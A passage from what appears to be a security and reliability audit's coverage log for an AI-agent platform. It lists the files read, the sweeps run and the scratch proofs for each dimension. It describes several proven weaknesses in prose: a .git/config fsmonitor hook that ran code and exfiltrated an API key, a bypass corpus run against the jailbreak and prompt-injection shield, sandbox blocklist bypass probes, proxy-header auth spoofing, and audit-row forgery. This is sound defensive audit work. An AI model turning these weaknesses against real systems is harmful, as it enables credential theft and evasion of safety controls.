Read in full: packages/maverick-core/maverick/llm.py (1739 lines), all 16 files under providers/ (anthropic, openai, azure, bedrock, deepseek, gemini, moonshot, ollama, openai_compatible, openrouter, tgi, vllm, xai, codex_cli, base, __init__), retry/__init__.py, retry/classifier.py, cache/llm.py, cost/router.py, cost/router_v3.py, pricing.py, circuit_breaker.py, provider_failover.py, failover_policy.py, effort.py, tools/cost_aware_router.py, tools/provider_failover_policy.py, the shipped rate-card JSON (data/pricing-rate-card-2026-07-29.json, verified flags dumped). Read the relevant sections of budget.py (_billing_strict, _lookup_price_quote, record_tokens, reserve/release), config.py (load_config/get_role_model/get_provider_config, PROVIDER_KEY_ENV_MAP, PROVIDER_BASE_URL_ENV_MAP, tenant BYOK), preflight.py (context table + context_limit), provider_cost_cap.py (record/check), provider_health.py and rate_limit_predictor.py heads, context_scaling.py head, docs/FEATURES.md 'LLM providers & routing' + prompt-caching paragraphs, and the wizard's strict_pricing prompt. Ran scratch scripts (no repo writes) that proved: default-strict pricing raises UnpricedModelError pre-dispatch for azure/bedrock/openai_compatible/moonshot/openrouter/gemini-pro/xai-alias/deepseek-chat/opus-5/sonnet-5 specs; openai_compatible refuses to construct without an API key; five BudgetExceeded (or five 400s) raised inside the provider trip the anthropic circuit breaker and the sixth call raises CircuitOpen. Grep-swept for hard-coded model ids (kernel rule 2), image-block producers, budget-less LLM call sites (30 call sites, 4 without a budget), and on_delta callers. Anthropic API facts (model ids, thinking/temperature rules, cache minimums, context windows, fast-mode wire shape) come from the bundled claude-api skill reference (cached 2026-06-24); live API behaviour could not be exercised (no provider key). Not read: cost/{by_tag,curve_fitter,forecast,projection,report,retrospective}.py (spend analytics, not the adapter layer), cache/{file,tool,learning,redis_tool,eviction}.py (non-LLM caches), provider_local_first.py, energy_aware_router.py, model_cost_tier.py, routing.py, the bulk of config.py, and the provider test files beyond spot checks.

**kernel-agent-loop** (W1-kernel, 22 raised)  
READ FULLY: packages/maverick-core/maverick/agent.py (all 4,441 lines incl. _run_inner, _run_tool and every gate, checkpoint resume/save helpers), orchestrator.py (all 2,607 lines), budget.py, swarm.py, blackboard.py, runner.py, tools/spawn.py, tools/ask_user.py, dispatch_contract.py, tools/__init__.py (ToolRegistry + base_registry), checkpoint.py, compaction/__init__.py, compaction/plugins.py. SAMPLED: compaction/hybrid.py (enabled()/wiring only), tool_authz.py (authorize), flow/execution.py dispatch block, tools/code_exec.py, tool_reliability.py, safety/rate_limiter.apply_to_registry, providers/openai_provider._to_openai_messages, providers/anthropic_provider cache-breakpoint block, llm.py reserve/estimate paths and prewarm, verifier.verify_final, coding_mode.from_env/find_final_marker_end, domain.agent_from_profile, killswitch.check, dashboard api.py cancel_goal, tests: test_agent_loop.py (fixtures + FINAL tests), test_agent_loop_612.py, test_durable_checkpoint.py, test_resume_answers.py, test_wave3.py fan-out test, conftest FakeLLM. NOT REACHED: compaction/{graph,learned,multimodal,streaming,strategies}.py bodies (prior audit covered; not on the default path), review_checkpoint.py internals, world_model.py, governance/autonomy modules behind the gates (treated as black boxes). VERIFIED BY EXECUTION: 7 scratch repro tests in scratchpad/audit/work/kernel-agent-loop/test_repro.py (plain-text-final verifier bypass, domain-root verifier skip, coding-mode reject loop to max_steps, durable resume dropping the answered question, dashboard cancel ignored mid-run, fan-out truncation invisible in tool result, non-str spawn role crash) plus python probes for Budget inf/nan caps, UnpricedModelError -> budget message, base_registry build time (0.05s, 3,302 tools), and `python -m maverick.dispatch_contract` (4 sites, 0 unsanctioned). Prior audits grepped for every cited path; only the _run_inner size item was previously reported.

**world-model-data** (W1-kernel, 23 raised)  
Read in full: packages/maverick-core/maverick/world_model.py (4166 lines), world_model_backends/postgres.py (4835), world_model_backends/pg_rls.py, world_model_backends/__init__.py, schema_migrations.py, migration_governance.py, migrations.lock.json (head), backup.py (1186), crypto_at_rest.py (1030), paths.py, job_queue.py, replay/trace.py, replay/export.py, audit/retention.py (lines 160-290), cli/_trust_groups.py backup/restore commands, cli/__init__.py gc command. Sampled: replay/video.py (first 120 lines only), dashboard api.py/app.py/auth.py call sites for world methods, docs/operations.md, docs/encryption.md, docs/enterprise/deployment-playbook.md backup sections. Ran scratch proofs (all in the scratch dir, repo untouched): (1) backup archive member listing shows keys/at_rest.key bundled with world.db; (2) purge_episodes_before raises sqlite3.IntegrityError FOREIGN KEY when a fact references an episode; (3) restore_backup while a WorldModel is open loses the subsequent write (live handle's own read returns None, fresh open does not see it); (4) 300 short-lived reader threads retain 300 sqlite connections / +600 FDs; (5) a failing 2-statement migration leaves statement 1 committed with the version unbumped; (6) with default at-rest encryption 300 messages give messages_fts_data 430,080 bytes vs messages 413,696 bytes and search_messages returns 0 hits; (7) inspect-based public API diff between WorldModel and PostgresWorldModel (create_goal/list_goals/total_spend/search_goals signature gaps, list_active_goals PG-only). Ran python3 -m pytest on test_world_model_migrations.py, test_backup.py, test_migration_governance.py, test_schema_migrations.py: 76 passed. Not reached: no live Postgres server (PG findings are from code reading + signature inspection, not execution); tenant/kms.py envelope sealing; encryption_migrate.py; replay/video.py past line 120; the ~15 dashboard w.query() raw-SQL sites were spot-checked (parameterized, owner fragment built from a fixed template) but not exhaustively audited.

**concurrency-reliability** (W1-kernel, 17 raised)  
READ FULLY: packages/maverick-core/maverick/job_queue.py, worker.py, runner.py, tenant/concurrency.py, sandbox/local.py, control_data_plane_e2e.py, queue_dispatcher.py (all 1280 lines), maverick_dashboard/event_poll.py, _event_stream.py, automation_queue.py (head, tick/poll, slot guard, flow_run handler, start/stop), mcp_client.py stdio client (lines 370-860) + registry start/stop; dashboard app.py lifespan (437-700), api.py goal list/get/create/SSE handlers; world_model.py connection/reader/close code (1025-1275); file_lock.py cross_process_lock; github_app.py process_issue/clone_repo; server.py message handling (255-410). SAMPLED (grep-driven + targeted reads): all 14 maverick_dashboard/*_scheduler.py loops (start/stop/wait/backoff structure, poll floors, lease renewal threads in consent_scan/privacy_drop), control_data_plane_soak.py structure, grpc_dispatcher.py submit, consent_delivery/governance_agents Dispatcher classes, notification_batcher.py, mcp_oauth.py, tools/database_tool.py, entitlements.py refresher, maverick_knowledge/store.py, ai_discovery_sensor_agents.py connect, async_compaction.py, _mcp_parent_guard.py, consent_scanner.py threads, agent.py _complete_guarded, budget.py locking, automation_events.py HTTP/IMAP timeouts, all 12 Popen sites for wait/kill handling, channels glasses.py / mcp http_transport task retention. REPO-WIDE SWEEPS (AST scripts in scratch dir): blocking calls inside async defs (packages+apps), subprocess calls without timeout, threads without daemon, open()/sqlite3.connect outside with, module-level mutable state without locks (713 hits, filtered), requests/urlopen without timeout, and all 1,894 FastAPI async route handlers in the dashboard for zero-await bodies (469 hits). Verified installed runtime semantics: anyio 4.15.1 WorkerThread MAX_IDLE_TIME=10 pruning, starlette 1.6.0 BackgroundTask -> run_in_threadpool, asyncio default executor size (min(32,cpu+4)=8 here). EXPERIMENTS RUN: demo_reader_leak.py (200 short-lived threads -> 200 retained sqlite reader connections, +400 fds), demo_complete_fail.py (complete() raising once -> handler executed twice, job done with attempts=2). NOT REACHED: per-suite *_api.py/*_composition.py business handlers beyond the zero-await census; Postgres world backend (world_model_backends/) concurrency; rust/go components; Tauri apps; full runtime load tests (no provider key). Prior-audit cross-check done against ADVERSARY_COUNCIL_REVIEW.md (#13/#14) and CODE_QUALITY_AUDIT.md rows for runner.py, notification_batcher.py, mcp_oauth.py, tenant/concurrency.py, database_tool.py (the last is fixed at HEAD: engine.dispose() present).

**sandbox-isolation** (W1-kernel, 25 raised)  
Read fully (every line): packages/maverick-core/maverick/sandbox/{__init__,local,docker,podman,devcontainer,kubernetes,ssh,firecracker,gvisor,modal_backend,network_policy,pool,sdk}.py; tools/{shell,fs,code_exec,apply_patch,str_edit,container_build,containment_mode,wasm_run,notebook_exec,repl}.py; tools/__init__.py lines 40-175 (scrub_child_env, sandbox_run). Sampled: governed_repl.py 320-410 (driver command / sandbox use), agent.py 588-625 and 2150-2200 and 4195-4215 (workspace path canonicalisation, read_only_paths denial, parallel tool dispatch), air_gap.py 95-132, self_learning.py 1070-1110, installer wizard sandbox step (wizard.py 5110-5215), the prior-audit docs (grep for sandbox topics), docs/FEATURES.md sandbox sections, README/ARCHITECTURE backend tables, and the sandbox test file list. Ran scratch experiments against LocalBackend in a temp dir (stdin inheritance, scrub_env over-strip, 400 MB output memory growth, sandbox_run ARG_MAX failure at 100 KB stdin, opaque-mode blocklist bypass probes, apply_patch path extraction) and a regex sweep of all 528 env var names the codebase reads against _SECRET_ENV_RE. Not reached / not runnable: docker, podman, kubectl, firectl, wasmtime and modal live paths (docker client present but no daemon; no cluster) so container flag behaviour was verified by code reading only; the Windows Job Object path in local.py could not be executed on this Linux box; e2b REST API shape could not be validated offline.

**tools-a-f** (W1-kernel, 31 raised)  
Read fully (cat -n, entry functions + all network/subprocess/file code): tools/__init__.py, _ssrf.py, _rest_connector.py, enterprise_connectors.py, and all 107 a-f tool modules in scope (a11y through fs.py). _connector_specs.py (3502 lines of dict literals) was sampled (header + ~120 lines) and checked programmatically instead: 2877 specs, no duplicate names, every non-keyless description names its env vars, no http:// default base URLs. Cross-checked supporting modules read partially: safety/tool_risk.py, http_fetch.py (is_blocked_host/_scan_fetched), governed_tools.py (write-op table, governance_enabled), agent.py (deferred_tools knob at 1595-1616, shield.scan_output at 2648), capability.py (capability_from_config), sandbox/docker.py (mount + -w /workspace), sandbox/ssh.py (PurePosixPath workdir), egress_guard tests. Empirically verified on this box: default base_registry size (3302 tools, 3077 deferrable, 225 always-visible ≈47k tokens of schema, 170 with unclassified risk), httpx dot-segment normalization end-to-end through asana/cloudflare/clickup, CGNAT 100.64/10 passing resolve_pinned_ip, safe_client bypassing HTTPS_PROXY (403 direct vs 200 via proxy), smtplib/imaplib default context = CERT_NONE on Python 3.11, compute fallback allocating [0]*10**7 unbounded, apply_patch/ast_edit/dep_graph/file_watcher erroring on SSHBackend, exchangerate.host returning missing_access_key. Not exercised: live SaaS APIs (no creds), playwright/pyautogui paths (extras absent), sqlalchemy path (not installed). Test coverage swept per module (direct test file + grep refs); connectors without a dedicated file are covered by tests/test_q*_batch*.py behavior tests with monkeypatched httpx. Prior audits grepped: CODE_QUALITY_AUDIT.md only flags database_tool engine disposal (already fixed) and an email_tool bare-except; none of the findings below appear there.

**injection-sweep** (W2-security, 7 raised)  
Grep-driven sweep of the whole repo for the brief's pattern families, then full reads of the highest-value hits. Read fully / verified: all `shell=True` sites (none outside sandbox/ — CI gate holds), all `subprocess`/`os.system`/`os.popen`/`os.exec*` call sites in packages+apps+scripts (all use argv lists, most with scrub_child_env; git call sites examined individually), the `eval`/`exec`/`compile` sites (self_learning generated-tool sandbox, governed_repl driver, verifiers_adapter locked scorer, tools/compute AST-allowlisted fallback — all hardened), every f-string SQL `execute(` hit (tables/columns come from fixed allowlists/constants with # noqa: S608; identifiers grammar-validated in provider adapters; PRAGMA values are int constants), archive extraction (backup.py, workspace_snapshot.py, docx/xlsx/zip readers — all have traversal + zip-bomb guards), all XML parsers (DOCTYPE/ENTITY rejected before parse), redirect helpers (SAML/OIDC open-redirect filters present and correct), Jinja `| safe` sites and dashboard innerHTML sinks (server-built HTML is html.escape'd; client JS uses esc()), crypto (sha1 only usedforsecurity=False), TLS (no verify=False/CERT_NONE in prod). I PROVED the git-config/fsmonitor command-execution finding end-to-end (ran maverick.edit_format.render_diff and maverick.reviewer.get_diff against a repo whose .git/config set core.fsmonitor to a script — the script executed and exfiltrated ANTHROPIC_API_KEY), and confirmed write_file can write .git/config in normal (non-opaque) mode. Time-tested shield/safety regexes and the shell.py gold-leak regex for ReDoS (found one quadratic pattern). Sampled but did not exhaustively read: every one of the ~294 tools/ modules (spot-checked path confinement across ~30), the Go/Rust/TS trees (grepped for exec/eval — no dynamic-string process exec found), deploy/ shell scripts (grepped for pipe-to-shell — install scripts pin refs). Did not reach: full manual read of all 150k dashboard LOC.

**dashboard-auth** (W2-security, 24 raised)  
READ FULLY: auth.py (1013 lines), oidc_login.py, saml.py, saml_replay.py, session_revocation.py, invites.py, invite_routes.py, rbac.py, route_identity.py, suite_grants.py, auth_metrics.py, scim_groups.py, workspace_tenants.py, tenant_select_page.py, in_app_routes.py, third_party_collaboration_portal.py, maverick/proxy_auth.py, maverick/oidc.py, maverick/web_session.py, maverick/capability_boot.py. app.py: read in full the auth/CSRF/loopback/proxy helpers (1286-1760), bearer_auth middleware (1787-1966), exception handlers (1966-2162), security_headers/bind_active_tenant/extension_cors/tenant_pinning middlewares (2162-2400), rate limiting (2400-2557), _require_auth_enabled/_assert_dashboard_auth_configured (350-450), page-visibility + expected-tenant dependencies (696-780), form/dsar/consent-webhook/share routes (8253-8365, 8715-8770), websocket route (6998-7040), CSP constants (1156-1192). SAMPLED: scim.py (auth gate, deprovision revocation, all 14 route heads confirmed calling _authorize), external_gateway.py (all credential dependencies: _require_agent, _require_discovery_sensor, _require_vendor_portal, red-team/runtime wrappers, rate limiter), consent_public_api.py (route inventory + _authorization_token/authenticate contract + bootstrap/configuration handlers), consent_native_sdk_api.py (preflight/auth section), partner_store.py (token custody + public_row), api.py share-link + active-tenant routes, world_model share_links, capability.py sign/verify surface. SYSTEMATIC SWEEP: enumerated all 1,920 effective routes (recursing FastAPI 0.141 _IncludedRouter wrappers; scratch routes2.tsv) and grep-classified every handler for auth/RBAC helper calls; every one of the 35 mutating handlers initially flagged delegates to a closure that calls require_permission/require_global_permission — RBAC coverage on mutations is complete; the 42 flagged GETs are auth-exempt bootstrap/probe routes or read routes that every role may view. PROVED BY SCRIPT: consent-webhook 401 under token/OIDC/proxy modes vs 403 in auth-off (proof2.py); /openapi.json serving 1,717 paths unauthenticated and no bad-token throttling (proof1.py); uvicorn ProxyHeadersMiddleware + X-Forwarded-For spoof/breakage of proxy auth (proof3.py, ASGITransport with client=127.0.0.1). NOT REACHED: pysaml2 internals (not installed here — SAML sync/metadata claims rest on code structure, confidence lowered), capability_fuzzer.py (not auth-relevant), the bodies of consent_public_api.py beyond the auth contract (4,831 lines), the ~1,600 non-auth route handlers' business logic, deploy/ proxy templates beyond confirming Host preservation.

**shield-safety** (W2-security, 13 raised)  
Read in full: maverick-shield guard.py, builtin_rules.py, deobfuscate.py, probe_model.py, cascade.py, compartment.py, constitutional.py, output_policy.py, phishing.py, __init__.py; core shield_policy.py, shield_ensemble.py, shield_updates.py, mcp_tools.py; safety/*.py (jailbreak_heuristics, unicode_filter, secret_detector, pii_detector, tool_acl, tool_risk, action_gate, dual_control, consent, remote_scan, self_modify_dlp, voice_safety, canaries, honeytokens, goal_risk, refusal_calibration, action_evidence, rate_limiter, __init__); tools/redact.py, tools/polyglot_injection.py. Mapped every chokepoint (grep of scan_input/scan_tool_call/scan_output across packages, ~40 call sites) and read the surrounding fail-direction logic in orchestrator.py, agent.py, server.py (core + mcp), external_agents.py, memory_guard.py, intake.py, attachments.py, grpc_plugin_host.py, catalog_trust.py, agent_framework_adapters.py, insight_exchange.py, fleet_memory.py, reflexion.py, dreaming.py, experience.py, self_learning.py, skill/synthesis.py, ai_runtime_guardrails.py, mcp sidecar.py, knowledge base.py. Ran live bypass corpus against builtin_rules.scan() AND the full Shield.scan_input pipeline (builtin backend = what actually ships). Verified ShieldVerdict has no `blocked` attribute, that staged shield_rules.json has no loader, and detector gaps (ASIA, IBAN) and the tool_risk ceiling no-op by execution. Checked prior audits (CODE_QUALITY_AUDIT.md, ADVERSARY_COUNCIL_REVIEW.md) for overlap. Did NOT deep-read: benchmarks/security corpus internals, probe_train.py/corpus_release.py/redteam.py (tooling, not runtime), rust/mvk-scan native port. Could not exercise the agent-shield SDK backend (not installed anywhere; builtin is the shipped backend, which is what I tested).

**crypto-secrets** (W2-security, 23 raised)  
READ FULLY: tenant/kms.py, tenant/kms_fleet.py, oauth_vault.py, crypto_at_rest.py (all 1030 lines), audit/signing.py (all 1621), audit/sealing.py, audit/worm.py (all 944), audit/writer.py (all 1082), audit/export.py, audit/federation.py, tools/key_rotation.py, tools/jwt_inspect.py, oidc.py, capability.py, capability_boot.py, tool_token.py, secrets.py, secret_provider.py, safety/secret_detector.py, kms_backends.py, approval_signing.py, federation_envelope.py, encryption_migrate.py, web_session.py, keymap.py, file_lock private-file helpers. SAMPLED (grep + targeted reads): settings_store.py (secret sealing/masking/rotation paths), config.py (.env loader, provider-key env map), installer wizard.py (all file writers: _write_wizard_file, _save_partial, validation cache, key collection), dashboard oidc_login.py (state/PKCE/nonce/cookie), health_routes.py, auth.py/api.py/app.py bearer compares, sandbox/local.py scrub_env, operator_preflight.py + soc2.py custody sections, proof_guarantees.py custody gating, trust_receipt(s), flow/approvals.py, webhooks.py inbound secret, governed_document_vault.py/browser_auth_vault.py/screenshot_seal.py (crypto lines only), audit/erase.py + retention.py + reader.py + checkpoints.py (grep for verify/sign interactions). Repo-wide greps: random-for-tokens (none found), non-constant-time secret compares (none found), md5/sha1-for-security (none), ECB/CBC/verify=False/CERT_NONE (none), KDF iterations (none used), secrets in logs (none found beyond prior-audit items), secrets in URLs/argv. PROVEN BY SCRATCH SCRIPTS (in work dir): forge_row.py (cross-protocol audit-row forgery), keyring_mtime.py, readpath_key.py, kms_fallback.py, pinned_rotation.py, preflight_stale.py, scrub_env/secret-name scan, jwt_inspect crash, lowercase-secret scrub gaps. NOT REACHED: full reads of audit/checkpoints.py, audit/retention.py, capability_fuzzer.py, sigstore_signing.py body, gRPC/model-proxy TLS settings, channel webhook HMAC adapters (covered by prior audits), rust/go ports, Postgres world_model_backends encryption paths.

**tenant-isolation** (W2-security, 19 raised)  
READ FULLY: packages/maverick-core/maverick/tenant/registry.py (1038 lines), paths.py (483), workspace.py, tenant/egress.py, tenant/concurrency.py, quotas.py, world_model_backends/pg_rls.py, maverick_dashboard/workspace_tenants.py, tenant_select_page.py. READ IN TARGETED SECTIONS: world_model_backends/postgres.py (grep-mapped all 'tenant'/RLS/pool lines; read 690-1010 predicates and 1095-1335 __init__/_tx/_set_tenant_guc/_preflight/_apply_rls/_rls_policy_is_active in full; AST-scanned all 112 _tx-using methods for nested transactions -- none); dashboard auth.py tenant pinning (380-430, 880-925), app.py bind_active_tenant + tenant_pinning middleware (2230-2385), api.py admin tenant routes (1020-1245), PUT /workspace/active-tenant (386-450), _active_cache_context, automation_queue tenant iteration (155-262), ai_governance_loop_scheduler (125-165), settings_store.active_tenant/set_active_tenant, rbac.py tenant-role store, world_model.py default_db_path/world_for_tenant/LRU cache, audit/writer.py per-dir cache, server.py _message_tenant_world/_tenant_door_refusal/concurrency, channels base.py, maverick_mcp server.py _canonical_world + http_transport bearer auth, CLI tenant rls-preflight/backfill, budget.py _clamp_to_tenant_remainder, orchestrator.py tenant gate, governed_records.py rolsuper check, egress_guard.py header, deploy/postgres/README.md, docs/multi-tenancy.md. SAMPLED BY GREP: all 18 data_dir(tenant=None) forced-global stores (dreams/reflexion/learned-skills/vector stores resolve per-tenant at call time; audit writer per-dir; anon salt/consent key/mcp_analytics/HALT/ekko/self_modify/customer_sandbox deployment-global by design); all 16 shared() singletons (13 key by call-time path; 3 use a bare global); all 10 dashboard modules using maverick_home() (auth-plane stores; subject_directory hashed); 14 *_scheduler.py tenant iteration (13 iterate tenants, the 14th is supplier-driven); 73 tools/ modules making HTTP calls vs egress consumers; dashboard module-level caches. PROVED BY SCRATCH SCRIPTS (two temp MAVERICK_HOMEs): by_user tenant refused once any roster exists; stale tenant RBAC role + workspace selection survive delete/recreate; tenant_id column value vs backfill id mismatch for non-slug ids; Workspace.current() tenant=None under client binding. NOT REACHED: tenant/kms.py + kms_fleet.py (crypto, out of this dimension's method), postgres.py per-method predicate correctness beyond the grep map (~4,800 lines), settings_store beyond tenant selection, the ~140 dashboard suite modules' own per-tenant stores (they route through tenant_scope/current_tenant_id_strict per grep), live Postgres behavior (no PG server on this box -- RLS findings are code-read, marked with verification hints), CODE_QUALITY item on qdrant query tenant filter was re-checked and is now fixed (qdrant_store.py:174-181) so not reported.

**network-egress** (W2-security, 23 raised)  
Read fully: egress_guard.py, egress_contract.py, egress_accounting.py, air_gap.py, tools/_ssrf.py, tools/http_fetch.py, tools/web_search.py, tools/web_archive.py, tools/openapi_runner.py, tools/websocket_tool.py, tools/dns_lookup.py, tools/_rest_connector.py, audit/forwarder.py, tenant/egress.py, enterprise.py (lines 1-130, 255-620), sandbox/network_policy.py (header + _matches), maverick/__init__.py guard install. Sampled (grep + targeted reads): browser.py (URL guard/navigation sections), observability.py, notifications.py, entitlements.py, catalog.py, skills.py, policy_packs.py, tax_constants.py, prm.py, run_share.py, voice_models.py, adapter_rung.py, email_tool.py, sns_tool.py, mailer.py, federation.py/grpc_dispatcher.py/grpc_tls.py (TLS gating), consent_scanner.py (pinned SOCKS proxy), webhooks.py, mcp_client.py, llm_gateway.py, maverick_mcp/sidecar.py, channels slack/discord/email. Ran: `python -m maverick.egress_contract --list` (census), an AST sweep over packages/ apps/ for httpx/requests calls without timeout (0 found) and follow_redirects=True (6, all fixed hosts), a live probe of safe_get vs guarded_urlopen vs plain httpx under this box's HTTPS_PROXY=http://127.0.0.1:33825 (guarded_urlopen fails: refuses the proxy IP), ipaddress classification probes (100.100.100.200 not blocked; hex/octal/decimal IPv4 forms resolve to 127.0.0.1 and are blocked), httpx source checks (allow_env_proxies = trust_env and transport is None; explicit transport discards verify), urllib HTTPRedirectHandler source (Authorization forwarded cross-host; POST->GET on 301/302/303), and a MockTransport probe of _PinnedTransport (IDN Host header sent as Unicode). External hosts inventoried from https:// literals in non-test code: none contacted by default in a fresh install; opt-in/on-use hosts are html.duckduckgo.com (web_search with no keys), archive.org (web_archive), raw.githubusercontent.com/cdayAI/awesome-maverick (catalog default index when templates/mcp_registry/marketplace load), huggingface.co (voice model download), api.github.com gists (run_share), ntfy.sh/pushover/discord/slack ([notifications] backend), sentry.io (MAVERICK_SENTRY_DSN), OTLP localhost:4318 default, license api_url, [shield]/[tax] update_url, plus ~150 SaaS connector hosts behind explicit env credentials. Not reached: websockets and sentry_sdk are not installed here, so websockets' cross-origin redirect behaviour with a pinned host kwarg and Sentry's urllib3 transport were verified from library knowledge only (noted in confidence); Playwright browser tool could not be executed; the dashboard (~150k LOC) was only grep-swept for outbound calls (census shows only load_harness.py and oidc_login.py issue HTTP); go/model-proxy, rust/, Tauri apps and deploy/ network policy were out of scope.

**dashboard-suite-apis** (W3-dashboard, 17 raised)  
Scope: 140 modules (67 *_api.py, 35 *_composition.py, 24 *_page.py, 14 *_scheduler.py; 87,308 lines) under packages/maverick-dashboard/maverick_dashboard. Systematic sweeps over ALL 140 modules via scratch scripts: (1) router table (prefix, route count, mutating routes, guard calls, tenant helpers, pydantic bodies, app.py mount); (2) AST guard-reachability check for every route handler (transitive through module-local helpers) — every non-public route has a reachable guard; the 20 flagged handlers are intentionally public (consent SDK/federation/OTT-CTV/policy-link/external-portal routers, receipt-key discovery per QA-033); (3) AST scan of async routes with no await (46, mostly cheap status routes); (4) duplicated-helper census (_StrictModel x61, _tenant_id x48, _jsonable x30, _call x26, _principal x22, _sha256/_digest x29, _principal_ref x14, CSP-nonce boilerplate x19 pages); (5) file-write/atomic-write/lock sites; (6) template existence for every _page.py (all exist) and |safe/Markup scan of their templates (none); (7) test-file gap list cross-checked against route prefixes in tests/. Read fully: _shared.py helpers, vendor_onboarding_{api,composition,page}, red_team_scheduler, tenant_select_page, shoring_page, autonomous_compliance_page, third_party_intelligence_scheduler loop, finance_scheduler start/loop, ai_governance_loop_scheduler attach, consent_scan_scheduler loop/start/stop/_record, automation_queue._run_for_active_tenants, auth.py permission/principal sections, model_risk_api gateway limiter, policy_publication_links limiter + public route, third_party_collaboration external routes, consent_web_publish_settings public router, customer_sandbox_api authority section, all 22 _principal copies and all 26 _call copies. Live verification: TestClient probe in a scratch MAVERICK_HOME under static-bearer and auth-off modes (probe.py in scratch dir) proving the 401-vs-200 divergence across sibling suites. Sampled only (targeted greps/sections, not full reads): model_risk_api.py (5545 lines), consent_public_api.py (4831), security_api.py (2940), ai_evidence_analysis_composition.py (2717), consent_native_composition.py (2072), governance_agents_composition.py (1980), identity_governance_scheduler.py (1711) and the remaining large compositions — their internal business logic was not audited line-by-line. Not attempted: per-id existence-check audit across all routes (too broad; no evidence of a systemic gap found in samples), Postgres-backend behaviour of these modules (all use core stores), and JS/template client behaviour beyond escaping.

**dashboard-core-api** (W3-dashboard, 25 raised)  
Read fully: app.py (all ~10.5k lines in chunks; 1-2300 middleware/auth/lifespan read line-by-line), api.py (all ~14.6k lines except a ~200-line stretch 2775-2985 read partially and the imported sub-router include block), api_schemas.py (full), settings_store.py (full), health_routes.py, _shared.py, _event_stream.py, event_poll.py, goal_tree.py, goal_feedback_store.py, deliverables.py, themes.py, i18n.py, admin_pages.py, workflow_ai.py, control_plane.py, onboarding_state.py, copilot_context.py (head + tail; the middle ~700 lines are static page-context data, sampled), operator_cockpit.py (head only; presentation-only), ui_visibility.py (registry sampled + function list). Route inventory built with a scratch script over lazy-included routers (576 routes: 338 api, 216 app, 22 admin_pages; all async). Ran TestClient probes on an empty DB with edge inputs (probe1-4), a 20k-goal benchmark for /deliverables, a settings_store round-trip test for every SWITCHABLE_SECTIONS entry, a 30MB body test, and a metrics-ordering test; all scripts under the scratch dir. Prior audits grepped (CODE_QUALITY_AUDIT/ADVERSARY_COUNCIL_REVIEW/QA_FINDINGS/...): the api.py retitle/reparent Postgres finding and the oversight 'Active now' raw-SQL finding are fixed at HEAD; /healthz OIDC redaction is fixed. Not reached: RBAC-mode probes with real OIDC principals (only auth-off/no-token and static-token modes exercised), Postgres backend behaviour (no server), templates beyond base.html/shared_goal.html, the ~60 suite *_api.py routers included by api.py (out of scope).

**cli-ux** (W3-dashboard, 28 raised)  
READ FULLY: packages/maverick-core/maverick/cli/__init__.py (all 7,180 lines), packages/maverick-core/maverick/health.py (all 1,045 lines), cli/_ops_groups.py, _learning_groups.py, _agent_control_plane_groups.py, _governed_execution_groups.py, _codec_groups.py, _connector_groups.py, _import_groups.py, _knowledge_groups.py, _cortex_groups.py, _reporting_groups.py, _training_groups.py, _voice_groups.py, _external_agent_groups.py, _trust_groups.py (all 819 lines). SAMPLED: _ekko_groups.py (first 200 of 505 lines), _finance_groups.py (head + demo command), _compliance_groups.py (soc2 command + command inventory + grep sweeps for exit codes/--format/write_text/exception handling across all four large group files). RAN: `maverick --help` (0.33 s wall); a scratch walker that enumerated the full click tree (473 nodes: 397 commands, 76 groups) and executed `--help` for every node in a real subprocess — 0 non-zero exits, 0 slower than 1 s; a 220-command offline battery against a scratch MAVERICK_HOME (doctor, preflight, launch-check, demo, support, safety, soc2, enterprise verify, config*, status/history/ps/runs, cost/costs/spend/budget, audit*, tenant*, billing*, schedule*, fleet*, erase/erase-verify/export-user, every top-level group with no subcommand, plus deliberately bad inputs) — exactly 2 raw tracebacks found (`share`, `mcp` under MAVERICK_REQUIRE_ENTERPRISE) and all exit codes recorded; a scratch proof that `chat`/`debate` ignore `[budget]` config; a docs-vs-CLI diff over README.md, docs/getting-started.md, docs/operations.md, docs/handbook.md and then all of docs/**. Prior audits (CODE_QUALITY_AUDIT.md, ADVERSARY_COUNCIL_REVIEW.md, QA_FINDINGS.md, FIXES.md, PUNCHLIST_RESOLUTION.md, STRESS_TEST.md) grepped for CLI/doctor topics. NOT REACHED: live-LLM paths (`start`, `chat`, `debate` with a real key — no provider key available), the remaining ~2,600 lines of _compliance_groups.py and ~500 lines of _finance_groups/_ekko_groups (pattern-swept only), the installer wizard (out of scope), Windows-specific behaviour (reasoned from stat semantics, not executed).

**frontend** (W3-dashboard, 12 raised)  
READ FULLY: app.py CSP/security-header middleware (lines 1150-1200, 2160-2232, 3630-3675, 9285-9350), maverick/a11y_audit.py (entire), i18n.py (entire), _hero.html, error.html, base.html head/nav/dialog sections, lightwork-analytics.js, extensions/widget/maverick-widget.js render path, tenant_select_page._safe_return_path, oidc_login._is_safe_return_to, tests/test_ui_csp_and_escaping.py, web/index.html header/footer, both widget READMEs. SWEPT BY SCRIPT over all 148 templates + 36 static JS + 8 CSS (the brief's "72 JS" count does not match HEAD: 36 exist): every |safe (6), every {{ }} inside <script> (19, all int/bool/tojson or {% raw %}), every innerHTML/insertAdjacentHTML/document.write/eval/outerHTML/srcdoc/DOMParser sink (2 in static JS, 40 in template scripts — each context dumped and read for esc() usage), every on*= attribute (6), every href/src/style attribute interpolation, every location/href assignment (all constant paths, object URLs, or validated: OAuth URL checked https+redirect_uri, copilot href allowlisted, return_to sanitized against //, \, control chars), localStorage/sessionStorage use (no tokens stored), all 269 fetch() sites (heuristic status/catch scan, then manual reads of the flagged ones), all setInterval/polling loops, all 256 unique hardcoded URLs probed live through TestClient after lifespan (only 404s: /auth/logout which is gated by show_logout, and three POST-only routes that 404 on GET because they sit on conditionally-included routers — none broken), macro-call argument parsing for hero()/state(), duplicate id detection (4 hits, all in mutually exclusive if/else branches), tables without <th>, first-heading level per child template, viewport/lang on all 3 root templates, WCAG contrast ratios computed for all 5 theme palettes (every text/muted/accent/warn/danger/brand/info on bg and panel >= 4.48; all >= 4.5 except the DEAD early dark palette's brand-fg 4.14 which is overridden), prefers-reduced-motion (present in lightwork.css and 5 module CSS files), RTL (logical properties used: 20 logical vs 6 physical), asset/template liveness (no unreferenced static file or template), JS test coverage per static file, CI wiring of node tests (mcp-clients.yml runs them). CLEAN AREAS (no finding): static-JS XSS sinks all escape; forest_html/_render_tree_html escape with quote=True; SRI pinned on the single CDN script; open-redirect guards correct; error.html reload link cannot be made protocol-relative (probed //evil, /%2F%2F, /\); dialogs use native <dialog>/showModal or have Escape + focus-return; navfinder combobox has arrow/escape/aria-activedescendant; toast regions have aria-live; skip link present. SAMPLED ONLY: the 1952-line inline script in _governance_operations.html (grep-level), consent SDK (64KB, 